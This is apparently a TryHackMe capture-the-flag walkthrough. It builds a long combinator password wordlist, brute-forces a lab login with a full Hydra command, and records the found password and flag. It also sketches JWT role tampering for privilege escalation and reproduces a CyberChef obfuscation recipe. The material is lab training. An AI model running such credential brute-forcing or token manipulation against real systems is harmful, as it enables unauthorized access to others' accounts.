let's take our clues and create some passwords with combinator.bin

list 1

Pizza
pizza
Johnnyboy
johnnyboy

list 2 

1234
1982
43 

Following the pattern we'll also add special characters '$!@#%&' to the end of all of these for the following wordlist

```
pizza1234
pizza1982
pizza43
Pizza1234
Pizza1982
Pizza43
Johnnyboy1234
Johnnyboy1982
Johnnyboy43
johnnyboy1234
johnnyboy1982
johnnyboy43
pizza1234$
pizza1234!
pizza1234@
pizza1234#
pizza1234%
pizza1234&
pizza1234*
pizza1982$
pizza1982!
pizza1982@
pizza1982#
pizza1982%
pizza1982&
pizza1982*
pizza43$
pizza43!
pizza43@
pizza43#
pizza43%
pizza43&
pizza43*
Pizza1234$
Pizza1234!
Pizza1234@
Pizza1234#
Pizza1234%
Pizza1234&
Pizza1234*
Pizza1982$
Pizza1982!
Pizza1982@
Pizza1982#
Pizza1982%
Pizza1982&
Pizza1982*
Pizza43$
Pizza43!
Pizza43@
Pizza43#
Pizza43%
Pizza43&
Pizza43*
Johnnyboy1234$
Johnnyboy1234!
Johnnyboy1234@
Johnnyboy1234#
Johnnyboy1234%
Johnnyboy1234&
Johnnyboy1234*
Johnnyboy1982$
Johnnyboy1982!
Johnnyboy1982@
Johnnyboy1982#
Johnnyboy1982%
Johnnyboy1982&
Johnnyboy1982*
Johnnyboy43$
Johnnyboy43!
Johnnyboy43@
Johnnyboy43#
Johnnyboy43%
Johnnyboy43&
Johnnyboy43*
johnnyboy1234$
johnnyboy1234!
johnnyboy1234@
johnnyboy1234#
johnnyboy1234%
johnnyboy1234&
johnnyboy1234*
johnnyboy1982$
johnnyboy1982!
johnnyboy1982@
johnnyboy1982#
johnnyboy1982%
johnnyboy1982&
johnnyboy1982*
johnnyboy43$
johnnyboy43!
johnnyboy43@
johnnyboy43#
johnnyboy43%
johnnyboy43&
johnnyboy43*
pizzapizza
pizzaPizza
pizzaJohnnyboy
pizzajohnnyboy
Pizzapizza
PizzaPizza
PizzaJohnnyboy
Pizzajohnnyboy
Johnnyboypizza
JohnnyboyPizza
JohnnyboyJohnnyboy
Johnnyboyjohnnyboy
johnnyboypizza
johnnyboyPizza
johnnyboyJohnnyboy
johnnyboyjohnnyboy
pizzapizza1234
pizzapizza1982
pizzapizza43
pizzaPizza1234
pizzaPizza1982
pizzaPizza43
pizzaJohnnyboy1234
pizzaJohnnyboy1982
pizzaJohnnyboy43
pizzajohnnyboy1234
pizzajohnnyboy1982
pizzajohnnyboy43
Pizzapizza1234
Pizzapizza1982
Pizzapizza43
PizzaPizza1234
PizzaPizza1982
PizzaPizza43
PizzaJohnnyboy1234
PizzaJohnnyboy1982
PizzaJohnnyboy43
Pizzajohnnyboy1234
Pizzajohnnyboy1982
Pizzajohnnyboy43
Johnnyboypizza1234
Johnnyboypizza1982
Johnnyboypizza43
JohnnyboyPizza1234
JohnnyboyPizza1982
JohnnyboyPizza43
JohnnyboyJohnnyboy1234
JohnnyboyJohnnyboy1982
JohnnyboyJohnnyboy43
Johnnyboyjohnnyboy1234
Johnnyboyjohnnyboy1982
Johnnyboyjohnnyboy43
johnnyboypizza1234
johnnyboypizza1982
johnnyboypizza43
johnnyboyPizza1234
johnnyboyPizza1982
johnnyboyPizza43
johnnyboyJohnnyboy1234
johnnyboyJohnnyboy1982
johnnyboyJohnnyboy43
johnnyboyjohnnyboy1234
johnnyboyjohnnyboy1982
johnnyboyjohnnyboy43
pizzapizza1234$
pizzapizza1234!
pizzapizza1234@
pizzapizza1234#
pizzapizza1234%
pizzapizza1234&
pizzapizza1234*
pizzapizza1982$
pizzapizza1982!
pizzapizza1982@
pizzapizza1982#
pizzapizza1982%
pizzapizza1982&
pizzapizza1982*
pizzapizza43$
pizzapizza43!
pizzapizza43@
pizzapizza43#
pizzapizza43%
pizzapizza43&
pizzapizza43*
pizzaPizza1234$
pizzaPizza1234!
pizzaPizza1234@
pizzaPizza1234#
pizzaPizza1234%
pizzaPizza1234&
pizzaPizza1234*
pizzaPizza1982$
pizzaPizza1982!
pizzaPizza1982@
pizzaPizza1982#
pizzaPizza1982%
pizzaPizza1982&
pizzaPizza1982*
pizzaPizza43$
pizzaPizza43!
pizzaPizza43@
pizzaPizza43#
pizzaPizza43%
pizzaPizza43&
pizzaPizza43*
pizzaJohnnyboy1234$
pizzaJohnnyboy1234!
pizzaJohnnyboy1234@
pizzaJohnnyboy1234#
pizzaJohnnyboy1234%
pizzaJohnnyboy1234&
pizzaJohnnyboy1234*
pizzaJohnnyboy1982$
pizzaJohnnyboy1982!
pizzaJohnnyboy1982@
pizzaJohnnyboy1982#
pizzaJohnnyboy1982%
pizzaJohnnyboy1982&
pizzaJohnnyboy1982*
pizzaJohnnyboy43$
pizzaJohnnyboy43!
pizzaJohnnyboy43@
pizzaJohnnyboy43#
pizzaJohnnyboy43%
pizzaJohnnyboy43&
pizzaJohnnyboy43*
pizzajohnnyboy1234$
pizzajohnnyboy1234!
pizzajohnnyboy1234@
pizzajohnnyboy1234#
pizzajohnnyboy1234%
pizzajohnnyboy1234&
pizzajohnnyboy1234*
pizzajohnnyboy1982$
pizzajohnnyboy1982!
pizzajohnnyboy1982@
pizzajohnnyboy1982#
pizzajohnnyboy1982%
pizzajohnnyboy1982&
pizzajohnnyboy1982*
pizzajohnnyboy43$
pizzajohnnyboy43!
pizzajohnnyboy43@
pizzajohnnyboy43#
pizzajohnnyboy43%
pizzajohnnyboy43&
pizzajohnnyboy43*
Pizzapizza1234$
Pizzapizza1234!
Pizzapizza1234@
Pizzapizza1234#
Pizzapizza1234%
Pizzapizza1234&
Pizzapizza1234*
Pizzapizza1982$
Pizzapizza1982!
Pizzapizza1982@
Pizzapizza1982#
Pizzapizza1982%
Pizzapizza1982&
Pizzapizza1982*
Pizzapizza43$
Pizzapizza43!
Pizzapizza43@
Pizzapizza43#
Pizzapizza43%
Pizzapizza43&
Pizzapizza43*
PizzaPizza1234$
PizzaPizza1234!
PizzaPizza1234@
PizzaPizza1234#
PizzaPizza1234%
PizzaPizza1234&
PizzaPizza1234*
PizzaPizza1982$
PizzaPizza1982!
PizzaPizza1982@
PizzaPizza1982#
PizzaPizza1982%
PizzaPizza1982&
PizzaPizza1982*
PizzaPizza43$
PizzaPizza43!
PizzaPizza43@
PizzaPizza43#
PizzaPizza43%
PizzaPizza43&
PizzaPizza43*
PizzaJohnnyboy1234$
PizzaJohnnyboy1234!
PizzaJohnnyboy1234@
PizzaJohnnyboy1234#
PizzaJohnnyboy1234%
PizzaJohnnyboy1234&
PizzaJohnnyboy1234*
PizzaJohnnyboy1982$
PizzaJohnnyboy1982!
PizzaJohnnyboy1982@
PizzaJohnnyboy1982#
PizzaJohnnyboy1982%
PizzaJohnnyboy1982&
PizzaJohnnyboy1982*
PizzaJohnnyboy43$
PizzaJohnnyboy43!
PizzaJohnnyboy43@
PizzaJohnnyboy43#
PizzaJohnnyboy43%
PizzaJohnnyboy43&
PizzaJohnnyboy43*
Pizzajohnnyboy1234$
Pizzajohnnyboy1234!
Pizzajohnnyboy1234@
Pizzajohnnyboy1234#
Pizzajohnnyboy1234%
Pizzajohnnyboy1234&
Pizzajohnnyboy1234*
Pizzajohnnyboy1982$
Pizzajohnnyboy1982!
Pizzajohnnyboy1982@
Pizzajohnnyboy1982#
Pizzajohnnyboy1982%
Pizzajohnnyboy1982&
Pizzajohnnyboy1982*
Pizzajohnnyboy43$
Pizzajohnnyboy43!
Pizzajohnnyboy43@
Pizzajohnnyboy43#
Pizzajohnnyboy43%
Pizzajohnnyboy43&
Pizzajohnnyboy43*
Johnnyboypizza1234$
Johnnyboypizza1234!
Johnnyboypizza1234@
Johnnyboypizza1234#
Johnnyboypizza1234%
Johnnyboypizza1234&
Johnnyboypizza1234*
Johnnyboypizza1982$
Johnnyboypizza1982!
Johnnyboypizza1982@
Johnnyboypizza1982#
Johnnyboypizza1982%
Johnnyboypizza1982&
Johnnyboypizza1982*
Johnnyboypizza43$
Johnnyboypizza43!
Johnnyboypizza43@
Johnnyboypizza43#
Johnnyboypizza43%
Johnnyboypizza43&
Johnnyboypizza43*
JohnnyboyPizza1234$
JohnnyboyPizza1234!
JohnnyboyPizza1234@
JohnnyboyPizza1234#
JohnnyboyPizza1234%
JohnnyboyPizza1234&
JohnnyboyPizza1234*
JohnnyboyPizza1982$
JohnnyboyPizza1982!
JohnnyboyPizza1982@
JohnnyboyPizza1982#
JohnnyboyPizza1982%
JohnnyboyPizza1982&
JohnnyboyPizza1982*
JohnnyboyPizza43$
JohnnyboyPizza43!
JohnnyboyPizza43@
JohnnyboyPizza43#
JohnnyboyPizza43%
JohnnyboyPizza43&
JohnnyboyPizza43*
JohnnyboyJohnnyboy1234$
JohnnyboyJohnnyboy1234!
JohnnyboyJohnnyboy1234@
JohnnyboyJohnnyboy1234#
JohnnyboyJohnnyboy1234%
JohnnyboyJohnnyboy1234&
JohnnyboyJohnnyboy1234*
JohnnyboyJohnnyboy1982$
JohnnyboyJohnnyboy1982!
JohnnyboyJohnnyboy1982@
JohnnyboyJohnnyboy1982#
JohnnyboyJohnnyboy1982%
JohnnyboyJohnnyboy1982&
JohnnyboyJohnnyboy1982*
JohnnyboyJohnnyboy43$
JohnnyboyJohnnyboy43!
JohnnyboyJohnnyboy43@
JohnnyboyJohnnyboy43#
JohnnyboyJohnnyboy43%
JohnnyboyJohnnyboy43&
JohnnyboyJohnnyboy43*
Johnnyboyjohnnyboy1234$
Johnnyboyjohnnyboy1234!
Johnnyboyjohnnyboy1234@
Johnnyboyjohnnyboy1234#
Johnnyboyjohnnyboy1234%
Johnnyboyjohnnyboy1234&
Johnnyboyjohnnyboy1234*
Johnnyboyjohnnyboy1982$
Johnnyboyjohnnyboy1982!
Johnnyboyjohnnyboy1982@
Johnnyboyjohnnyboy1982#
Johnnyboyjohnnyboy1982%
Johnnyboyjohnnyboy1982&
Johnnyboyjohnnyboy1982*
Johnnyboyjohnnyboy43$
Johnnyboyjohnnyboy43!
Johnnyboyjohnnyboy43@
Johnnyboyjohnnyboy43#
Johnnyboyjohnnyboy43%
Johnnyboyjohnnyboy43&
Johnnyboyjohnnyboy43*
johnnyboypizza1234$
johnnyboypizza1234!
johnnyboypizza1234@
johnnyboypizza1234#
johnnyboypizza1234%
johnnyboypizza1234&
johnnyboypizza1234*
johnnyboypizza1982$
johnnyboypizza1982!
johnnyboypizza1982@
johnnyboypizza1982#
johnnyboypizza1982%
johnnyboypizza1982&
johnnyboypizza1982*
johnnyboypizza43$
johnnyboypizza43!
johnnyboypizza43@
johnnyboypizza43#
johnnyboypizza43%
johnnyboypizza43&
johnnyboypizza43*
johnnyboyPizza1234$
johnnyboyPizza1234!
johnnyboyPizza1234@
johnnyboyPizza1234#
johnnyboyPizza1234%
johnnyboyPizza1234&
johnnyboyPizza1234*
johnnyboyPizza1982$
johnnyboyPizza1982!
johnnyboyPizza1982@
johnnyboyPizza1982#
johnnyboyPizza1982%
johnnyboyPizza1982&
johnnyboyPizza1982*
johnnyboyPizza43$
johnnyboyPizza43!
johnnyboyPizza43@
johnnyboyPizza43#
johnnyboyPizza43%
johnnyboyPizza43&
johnnyboyPizza43*
johnnyboyJohnnyboy1234$
johnnyboyJohnnyboy1234!
johnnyboyJohnnyboy1234@
johnnyboyJohnnyboy1234#
johnnyboyJohnnyboy1234%
johnnyboyJohnnyboy1234&
johnnyboyJohnnyboy1234*
johnnyboyJohnnyboy1982$
johnnyboyJohnnyboy1982!
johnnyboyJohnnyboy1982@
johnnyboyJohnnyboy1982#
johnnyboyJohnnyboy1982%
johnnyboyJohnnyboy1982&
johnnyboyJohnnyboy1982*
johnnyboyJohnnyboy43$
johnnyboyJohnnyboy43!
johnnyboyJohnnyboy43@
johnnyboyJohnnyboy43#
johnnyboyJohnnyboy43%
johnnyboyJohnnyboy43&
johnnyboyJohnnyboy43*
johnnyboyjohnnyboy1234$
johnnyboyjohnnyboy1234!
johnnyboyjohnnyboy1234@
johnnyboyjohnnyboy1234#
johnnyboyjohnnyboy1234%
johnnyboyjohnnyboy1234&
johnnyboyjohnnyboy1234*
johnnyboyjohnnyboy1982$
johnnyboyjohnnyboy1982!
johnnyboyjohnnyboy1982@
johnnyboyjohnnyboy1982#
johnnyboyjohnnyboy1982%
johnnyboyjohnnyboy1982&
johnnyboyjohnnyboy1982*
johnnyboyjohnnyboy43$
johnnyboyjohnnyboy43!
johnnyboyjohnnyboy43@
johnnyboyjohnnyboy43#
johnnyboyjohnnyboy43%
johnnyboyjohnnyboy43&
johnnyboyjohnnyboy43*
```

Now run Hydra against the login page...we'll use 8080 due to the error message being easier (could also do this with Burp Intruder Sniper attack)

`hydra -l guard.hopkins@hopsecasylum.com -P hopkins.txt 10.64.181.239 -s 8080 http-post-form "/cgi-bin/login.sh:username=^USER^&password=^PASS^:Invalid username or password"`

We find the password is Johnnyboy1982!

We're In! Unlock the cell doors

`THM{h0pp1ing_m4d}`

Hopkins creds also get us the camera feed access on port 13400

We can't access the psych ward feed but by observing the requests and responses in a tool like Burp we can see authentication is done using a JWT token. Perhaps we can escalate privileges by manipulating the token

```
Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1764908311}.a443235e96dd027d9d6f3482bafc2fa39029acd1cbc79f263f954ff3e5b861cd
```

Change role to 'admin' in dev tools, local storage

80 and 8080 may not be the same web interface

Try to brute 80 with Burp Intruder

## Hopper's Origin

## Passwords - A Cracking Christmas (access to SideQuest 2)

## CyberChef - Hoperation Save McSkidy (access to SideQuest 3)

```
Hopper managed to use CyberChef to scramble the easter egg key image. He used this very recipe to do it. The scrambled version of the egg can be downloaded from: 

https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1765955075920.png

Reverse the algorithm to get it back!
```

```
To_Base64('A-Za-z0-9+/=')
Label('encoder1')
ROT13(true,true,false,7)
Split('H0','H0\\n')
Jump('encoder1',8)
Fork('\\n','\\n',false)
Zlib_Deflate('Dynamic Huffman Coding')
XOR({'option':'UTF8','string':'h0pp3r'},'Standard',false)
To_Base32('A-Z2-7=')
Merge(true)
Generate_Image('Greyscale',1,512)
```

## Malware Analysis - Malhare.exe (access to sidequest 4)